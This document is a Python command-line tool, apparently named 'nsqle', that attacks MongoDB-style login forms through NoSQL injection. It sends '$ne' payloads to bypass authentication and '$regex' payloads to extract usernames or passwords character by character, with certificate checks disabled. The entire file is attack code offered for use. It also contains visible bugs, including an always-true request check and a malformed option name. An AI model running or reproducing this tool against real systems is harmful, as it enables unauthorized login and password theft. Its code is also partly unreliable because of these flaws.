#!/usr/bin/env python3


import string
import click
from sys import stdout, stderr, argv
from requests import post, get, put
from urllib3.exceptions import InsecureRequestWarning
from urllib3 import disable_warnings
disable_warnings()

class bc:
    PURPHEAD = '\033[35m'
    OKBLUE = '\033[34m'
    OKGREEN = '\033[32m'
    WARNING = '\033[33m'
    CYAN = '\033[36m'
    FAIL = '\033[31m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    DEFAULT = '\033[0m'

class CodeInjector:

    def __init__(self, h, r, up, pp, tg, ot):
        self.h = h
        self.r = r
        self.up = up
        self.pp = pp
        self.tg = tg
        self.ot = ot

    def test_injection(self):
        stdout.write('')
        if self.r is 'post' or 'POST':
            if self.inject(test=True):
                stdout.write(bc.OKGREEN + f'[+] Host {self.h} is injectable with "{self.up}" and "{self.pp}" parameters'+'\n'+bc.DEFAULT)
                return True
            else:
                stdout.write(bc.FAIL + f'[-] Host {self.h} is not injectable'+'\n'+bc.DEFAULT)
                return False

    def build_payload(self, test=False, char=''):

        injection_payloads = {f'{self.up}'  : {self.up + '[$regex]' : "^" + char + ".*", self.pp + '[$ne]' : '' + ',' + self.ot},
                              f'{self.pp}'  : {self.up + '[$ne]' : '', self.pp + '[$regex]' : "^" + char + ".*"',' + ',' + self.ot},
                              'test_pay' : {self.up + '[$ne]' : '', self.pp + '[$ne]' : '' + ',' + self.ot}}
        if test:
            return injection_payloads['test_pay']
        if not test:
            return injection_payloads[self.tg]

    def inject(self, test=False):
        badchar = r'&$^*\?+.|'
        payload = self.build_payload(test=True)
        if test:
            if self.r is 'POST':
                test_query = post(self.h, data=payload, allow_redirects=False, verify=False)
                if test_query.status_code == 302:
                    return True
        else:
            matches = []
            if self.r is 'POST':
                for c in string.printable:
                    if c in badchar:
                        continue
                    payload = self.build_payload(char=c)
                    query = post(self.h, data=payload, allow_redirects=False, verify=False)
                    if query.status_code == 302:
                        stdout.write(bc.OKBLUE + f'[+] Found matching character "{c}"\n'
                                  + bc.DEFAULT + '[*] Enumerating rest of string...\n')
                        matches.append(c)
                        while True:
                            for cc in string.printable:
                                if cc in badchar:
                                    continue
                                print(''.join(matches) + cc)
                                payload = self.build_payload(char=(''.join(matches) + cc))
                                query = post(self.h, data=payload, allow_redirects=False, verify=False)
                                if query.status_code == 302:
                                    stdout.write(bc.OKBLUE + f'[+] Found matching starting character "{cc}"\n')
                                    matches.append(cc)
                                    break
                            if query.status_code != 302:
                                return ''.join(matches)


def show_banner():
    stdout.write(r'''
                      |
  __ \    __|   _` |  |   _ \
  |   | \__ \  (   |  |   __/
 _|  _| ____/ \__, | _| \___|
                  _|
by disastrpc | github.com/disastrpc
Injection tool for NoSQL database engines like MongoDB'''+'\n\n')

show_banner()
@click.command()
@click.option('-self.r','--request',type=click.Choice(['POST','GET']),default='POST',
                    help='Choose request type',show_default=True)
@click.option('-U','userp',default='username',
                    help='Name of the username parameter',show_default=True,metavar='<str>')
@click.option('-P','passwdp',default='password',
                    help='Name of the password parameter',show_default=True,metavar='<str>')
@click.option('-p','--other-params','otherparam',default=[],
                    help='List of other parameters contained in the URL separated by commas',metavar='<key:val>')
@click.option('-t','--target',show_default=True,
                    help='Specify parameter to enumerate',metavar='<str>')
@click.argument('host')
def main(
    request='',
    userp='',
    passwdp='',
    otherparam=[],
    target='',
    host=''):
    injector = CodeInjector(host, request, userp, passwdp, target, otherparam)
    stdout.write(f"[*] Target: {host}\n[*] Request type: {request}\n[*] Params: {userp} {passwdp} {otherparam}\n[*] Injection point: {target}\n")
    if injector.test_injection():
        injector.inject()

if __name__ == '__main__':
    main()
